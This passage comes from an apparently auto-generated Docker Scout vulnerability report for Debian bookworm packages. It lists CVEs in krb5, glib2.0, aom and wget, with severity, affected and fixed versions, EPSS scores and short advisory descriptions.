OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."

---
http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
https://github.com/openssl/openssl/discussions/24540
Fault injection based attacks are not within OpenSSLs threat model according
to the security policy: https://www.openssl.org/policies/general/security-policy.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>krb5</strong> <code>1.20.1-2+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/krb5@1.20.1-2%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-37371?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u2"><img alt="critical : CVE--2024--37371" src="https://img.shields.io/badge/CVE--2024--37371-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.606%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.

---
- krb5 1.21.3-1
https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef (krb5-1.21.3-final)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-37370?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u2"><img alt="high : CVE--2024--37370" src="https://img.shields.io/badge/CVE--2024--37370-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.415%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.

---
- krb5 1.21.3-1
https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef (krb5-1.21.3-final)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-24528?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u3"><img alt="high : CVE--2025--24528" src="https://img.shields.io/badge/CVE--2025--24528-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.22 (with incremental propagation), there is an integer overflow for a large update size to resize() in kdb_log.c. An authenticated attacker can cause an out-of-bounds write and kadmind daemon crash.

---
- krb5 1.21.3-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1094730)
[bookworm] - krb5 1.20.1-2+deb12u3
https://bugzilla.redhat.com/show_bug.cgi?id=2342796
Fixed by: https://github.com/krb5/krb5/commit/78ceba024b64d49612375be4a12d1c066b0bfbd0

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-3576?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u4"><img alt="medium : CVE--2025--3576" src="https://img.shields.io/badge/CVE--2025--3576-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.079%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.

---
- krb5 1.21.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1103525)
[bookworm] - krb5 1.20.1-2+deb12u4
https://bugzilla.redhat.com/show_bug.cgi?id=2359465
CVE relates to issues covered in:
https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf
Since upstream 1.21 (cf. https://web.mit.edu/kerberos/krb5-1.21/) the KDC
will no longer issue tickets with RC4 or triple-DES session keys unless
explicitly configured with the new allow_rc4 or allow_des3 variables respectively.
https://github.com/krb5/krb5/commit/1b57a4d134bbd0e7c52d5885a92eccc815726463
https://github.com/krb5/krb5/commit/2cbd847e0e92bc4e219b65c770ae33f851b22afc

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26462?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u3"><img alt="low : CVE--2024--26462" src="https://img.shields.io/badge/CVE--2024--26462-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/kdc/ndr.c.

---
- krb5 1.21.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1064965)
[bookworm] - krb5 1.20.1-2+deb12u3
[bullseye] - krb5 <not-affected> (Vulnerable code introduced later)
[buster] - krb5 <not-affected> (Vulnerable code introduced later)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_3.md
Introduced by: https://github.com/krb5/krb5/commit/c85894cfb784257a6acb4d77d8c75137d2508f5e (krb5-1.20-beta1)
Fixed by: https://github.com/krb5/krb5/commit/7d0d85bf99caf60c0afd4dcf91b0c4c683b983fe (master)
Fixed by: https://github.com/krb5/krb5/commit/0c2de238b5bf1ea4578e3933a604c7850905b8be (krb5-1.21.3-final)
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.20.1-2%2Bdeb12u4"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.20.1-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.062%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.20.1-2%2Bdeb12u4"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.20.1-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.206%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.20.1-2%2Bdeb12u4"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.20.1-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.485%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>glib2.0</strong> <code>2.74.6-2</code> (deb)</summary>

<small><code>pkg:deb/debian/glib2.0@2.74.6-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-52533?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u5"><img alt="critical : CVE--2024--52533" src="https://img.shields.io/badge/CVE--2024--52533-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.671%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

gio/gsocks4aproxy.c in GNOME GLib before 2.82.1 has an off-by-one error and resultant buffer overflow because SOCKS4_CONN_MSG_LEN is not sufficient for a trailing '\0' character.

---
- glib2.0 2.82.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1087419)
[bookworm] - glib2.0 2.74.6-2+deb12u5
https://gitlab.gnome.org/GNOME/glib/-/issues/3461
https://gitlab.gnome.org/GNOME/glib/-/commit/25833cefda24c60af913d6f2d532b5afd608b821 (main)
https://gitlab.gnome.org/GNOME/glib/-/commit/ec0b708b981af77fef8e4bbb603cde4de4cd2e29 (2.82.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-13601?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u8"><img alt="high : CVE--2025--13601" src="https://img.shields.io/badge/CVE--2025--13601-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u8</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer overflow problem was found in glib through an incorrect calculation of buffer size in the g_escape_uri_string() function. If the string to escape contains a very large number of unacceptable characters (which would need escaping), the calculation of the length of the escaped string could overflow, leading to a potential write off the end of the newly allocated string.

---
- glib2.0 2.86.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121488)
[trixie] - glib2.0 2.84.4-3~deb13u2
[bookworm] - glib2.0 2.74.6-2+deb12u8
https://gitlab.gnome.org/GNOME/glib/-/issues/3827
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4914
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4915
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/9bcd65ba5fa1b92ff0fb8380faea335ccef56253 (2.86.3)
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/7e5489cb921d0531ee4ebc9938da30a02084b2fa (2.86.3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14512?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u8"><img alt="medium : CVE--2025--14512" src="https://img.shields.io/badge/CVE--2025--14512-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u8</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.060%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in glib. This vulnerability allows a heap buffer overflow and denial-of-service (DoS) via an integer overflow in GLib's GIO (GLib Input/Output) escape_byte_string() function when processing malicious file or remote filesystem attribute values.

---
- glib2.0 2.86.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122346)
[trixie] - glib2.0 2.84.4-3~deb13u2
[bookworm] - glib2.0 2.74.6-2+deb12u8
https://gitlab.gnome.org/GNOME/glib/-/issues/3845
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4935
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4936
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/4f0399c0aaf3ffc86b5625424580294bc7460404 (2.86.3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14087?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u8"><img alt="medium : CVE--2025--14087" src="https://img.shields.io/badge/CVE--2025--14087-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u8</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.422%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GLib (Gnome Lib). This vulnerability allows a remote attacker to cause heap corruption, leading to a denial of service or potential code execution via a buffer-underflow in the GVariant parser when processing maliciously crafted input strings.

---
- glib2.0 2.86.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122347)
[trixie] - glib2.0 2.84.4-3~deb13u2
[bookworm] - glib2.0 2.74.6-2+deb12u8
https://gitlab.gnome.org/GNOME/glib/-/issues/3834
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4933
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4934
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/3e72fe0fbb32c18a66486c4da8bc851f656af287 (2.86.3)
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/6fe481cec709ec65b5846113848723bc25a8782a (2.86.3)
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/dd333a40aa95819720a01caf6de564cd8a4a6310 (2.86.3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34397?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u1"><img alt="medium : CVE--2024--34397" src="https://img.shields.io/badge/CVE--2024--34397-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.190%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in GNOME GLib before 2.78.5, and 2.79.x and 2.80.x before 2.80.1. When a GDBus-based client subscribes to signals from a trusted system service such as NetworkManager on a shared computer, other users of the same computer can send spoofed D-Bus signals that the GDBus-based client will wrongly interpret as having been sent by the trusted system service. This could lead to the GDBus-based client behaving incorrectly, with an application-dependent impact.

---
- glib2.0 2.80.0-10
https://gitlab.gnome.org/GNOME/glib/-/issues/3268
Fixes: https://gitlab.gnome.org/GNOME/glib/-/issues/3268#fixes
Requires regression fix for src:gnome-shell: https://gitlab.gnome.org/GNOME/gnome-shell/-/commit/50a011a19dcc6997ea6173c07bb80b2d9888d363

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4373?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u7"><img alt="medium : CVE--2025--4373" src="https://img.shields.io/badge/CVE--2025--4373-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.170%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GLib, which is vulnerable to an integer overflow in the g_string_insert_unichar() function. When the position at which to insert the character is large, the position will overflow, leading to a buffer underwrite.

---
- glib2.0 2.84.1-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1104930)
[bookworm] - glib2.0 2.74.6-2+deb12u7
https://gitlab.gnome.org/GNOME/glib/-/issues/3677
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4588
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4592

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-0988?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.74.6-2%2Bdeb12u8"><img alt="low : CVE--2026--0988" src="https://img.shields.io/badge/CVE--2026--0988-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.74.6-2+deb12u8</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in glib. Missing validation of offset and count parameters in the g_buffered_input_stream_peek() function can lead to an integer overflow during length calculation. When specially crafted values are provided, this overflow results in an incorrect size being passed to memcpy(), triggering a buffer overflow. This can cause application crashes, leading to a Denial of Service (DoS).

---
[experimental] - glib2.0 2.87.1-1
- glib2.0 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1125752)
https://gitlab.gnome.org/GNOME/glib/-/issues/3851
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/c5766cff61ffce0b8e787eae09908ac348338e5f (2.87.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7039?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u7"><img alt="low : CVE--2025--7039" src="https://img.shields.io/badge/CVE--2025--7039-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in glib. An integer overflow during temporary file creation leads to an out-of-bounds memory access, allowing an attacker to potentially perform path traversal or access private temporary file content by creating symbolic links. This vulnerability allows a local attacker to manipulate file paths and access unauthorized data. The core issue stems from insufficient validation of file path lengths during temporary file operations.

---
- glib2.0 2.84.4-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1110640)
[trixie] - glib2.0 2.84.4-3~deb13u1
[bookworm] - glib2.0 2.74.6-2+deb12u7
https://gitlab.gnome.org/GNOME/glib/-/issues/3716
https://gitlab.gnome.org/GNOME/glib/-/merge_requests/4674
Fixed by: https://gitlab.gnome.org/GNOME/glib/-/commit/61e963284889ddb4544e6f1d5261c16120f6fcc3 (2.85.2)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-3360?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.74.6-2%2Bdeb12u6"><img alt="low : CVE--2025--3360" src="https://img.shields.io/badge/CVE--2025--3360-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.74.6-2+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>2.74.6-2+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.100%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GLib. An integer overflow and buffer under-read occur when parsing a long invalid ISO 8601 timestamp with the g_date_time_new_from_iso8601() function.

---
- glib2.0 2.84.1-1
[bookworm] - glib2.0 2.74.6-2+deb12u6
https://gitlab.gnome.org/GNOME/glib/-/issues/3647
https://gitlab.gnome.org/GNOME/glib/-/commit/8d60d7dc168aee73a15eb5edeb2deaf196d96114 (2.83.4)
https://gitlab.gnome.org/GNOME/glib/-/commit/2fa1e183613bf58d31151ecaceab91607ccc0c6d (2.83.4)
https://gitlab.gnome.org/GNOME/glib/-/commit/0b225e7cd80801aca6e627696064d1698aaa85e7 (2.83.4)
https://gitlab.gnome.org/GNOME/glib/-/commit/3672764a17c26341ab8224dcaddf3e7cad699443 (2.83.4)
https://gitlab.gnome.org/GNOME/glib/-/commit/0ffdbebd9ab3246958e14ab33bd0c65b6f05fd13 (2.83.4)
Introduced by https://gitlab.gnome.org/GNOME/glib/-/commit/491f835c17d200ede52c823ab1566c493479cdc1 (2.55.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2012-0039?s=debian&n=glib2.0&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.74.6-2%2Bdeb12u8"><img alt="low : CVE--2012--0039" src="https://img.shields.io/badge/CVE--2012--0039-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.74.6-2+deb12u8</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.492%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GLib 2.31.8 and earlier, when the g_str_hash function is used, computes hash values without restricting the ability to trigger hash collisions predictably, which allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted input to an application that maintains a hash table. NOTE: this issue may be disputed by the vendor; the existence of the g_str_hash function is not a vulnerability in the library, because callers of g_hash_table_new and g_hash_table_new_full can specify an arbitrary hash function that is appropriate for the application.

---
- glib2.0 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=655044)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>aom</strong> <code>3.6.0-1</code> (deb)</summary>

<small><code>pkg:deb/debian/aom@3.6.0-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-5171?s=debian&n=aom&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.6.0-1%2Bdeb12u1"><img alt="critical : CVE--2024--5171" src="https://img.shields.io/badge/CVE--2024--5171-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.6.0-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.6.0-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.209%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Integer overflow in libaom internal function img_alloc_helper can lead to heap buffer overflow. This function can be reached via 3 callers:     *  Calling aom_img_alloc() with a large value of the d_w, d_h, or align parameter may result in integer overflows in the calculations of buffer sizes and offsets and some fields of the returned aom_image_t struct may be invalid.   *  Calling aom_img_wrap() with a large value of the d_w, d_h, or align parameter may result in integer overflows in the calculations of buffer sizes and offsets and some fields of the returned aom_image_t struct may be invalid.   *  Calling aom_img_alloc_with_border() with a large value of the d_w, d_h, align, size_align, or border parameter may result in integer overflows in the calculations of buffer sizes and offsets and some fields of the returned aom_image_t struct may be invalid.

---
- aom 3.8.2-3
https://issues.chromium.org/issues/332382766
https://aomedia.googlesource.com/aom/+/19d9966572a410804349e1a8ee2017fed49a6dab
https://aomedia.googlesource.com/aom/+/8156fb76d88845d716867d20333fd27001be47a8

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>wget</strong> <code>1.21.3-1+b2</code> (deb)</summary>

<small><code>pkg:deb/debian/wget@1.21.3-1%2Bb2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-38428?s=debian&n=wget&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.21.3-1%2Bdeb12u1"><img alt="critical : CVE--2024--38428" src="https://img.shields.io/badge/CVE--2024--38428-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.3-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.3-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.197%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

url.c in GNU Wget through 1.24.5 mishandles semicolons in the userinfo subcomponent of a URI, and thus there may be insecure behavior in which data that was supposed to be in the userinfo subcomponent is misinterpreted to be part of the host subcomponent.

---
- wget 1.24.5-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1073523)
[bookworm] - wget 1.21.3-1+deb12u1
[buster] - wget <postponed> (Minor issue, infoleak in limited conditions)
https://lists.gnu.org/archive/html/bug-wget/2024-06/msg00005.html
Fixed by: https://git.savannah.gnu.org/cgit/wget.git/commit/?id=ed0c7c7e0e8f7298352646b2fd6e06a11e242ace

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
